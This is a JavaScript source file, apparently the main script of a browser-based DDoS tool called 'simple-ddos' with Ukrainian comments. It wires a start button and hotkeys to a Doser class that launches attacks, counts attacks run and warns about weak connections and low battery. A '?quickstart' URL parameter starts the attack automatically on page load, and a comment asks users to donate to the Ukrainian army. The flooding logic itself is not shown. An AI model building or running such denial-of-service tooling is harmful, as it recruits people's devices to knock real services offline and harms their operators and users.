/*!
MIT License

Copyright (c) 2022-2023 Yuriy Bogdan
*/

// JQuery main

$(async () => {
    /*
    Кхм. Зарплата прийшла?
    Тоді можеш задонатити на ЗСУ прямо зараз - <https://uahelp.monobank.ua>

    Дякую!
    */

    
    // Ініціалізація класів
    Panel = new Panel()
    Sword = new Sword()
    Doser = new Doser()

    Panel.button.click(/**Старт атаки*/ () => Doser.run());

    $('#attacks-section').click(
        /** Загальна кількість атак*/
        () =>
            swal(
                'Атаки',
                `Взагалом атаковано: ${Database.attacks}`,
                'info'
            )
    );

    // Якщо на сайт заходять з інтернету
    if (window.location.protocol != 'file:') {
        if (Device.onLine) {
            // Якщо заслабкий інтернет
            if (
                !['3g', '4g', '5g'].includes(Device.connection.effectiveType)
            ) {
                swal(
                    'Зауваження',
                    'У вас заслабкий інтернет!\nДля ефективної атаки - підключіться до WI-FI',
                    'warning'
                );
            }
        } else swal('Помилка', 'Немає підключення до інтернету!', 'error');
    }

    $(window).on({
        /**
         * Гарячі клавіші
         * @param {Event} e Подія
         */
        keyup(e) {
            switch (e.keyCode) {
                case 19 || 35 /* Pause | end */:
                    Doser.stop();
                    break;

                case 115 /* F4 */:
                    Doser.go();
                    break;
            }
        },
    });

    // Фішечки

    const battery = await Device.battery;

    battery.onlevelchange = function () {
        if (!this.charging) {
            const level = this.level * 100;

            switch (level) {
                case 15:
                    swal(
                        'Увага!',
                        'У вас сідає батарея (залишилось 15%)',
                        'warning'
                    );
                    break;

                case 10:
                    /*
                    Ми залишаємо 10% Резервного заряду задля того, щоб наша програма не зжирала батарею аж до нуля
                    Бо якщо раптом телефон сяде, а тут світло ще вимкнули, так що ось запобіжник
                    */
                    swal(
                        'Увага!',
                        'Критично низький заряд батареї, атаку буде вимкнуто\n\
                        Просимо поставити телефон на зарядку',

                        'warning'
                    ).then(() => Doser.stop());
                    break;
            }
        }
    };

    const params = new URLSearchParams(location.search);

    /*
    Читаємо URL-Параметри
    Приклад: https://bogdandevua.github.io/simple-ddos?quickstart
    */
    params.get('quickstart') && Doser.start();

    console.log(
        '%cЯкщо ти розробник - можеш допомогти проекту\nhttps://github.com/BogdanDevUA/simple-ddos',

        'font-size: 16px;\
         font-family: "Comic Sans MS";'
    );
});
// Слава Україні!
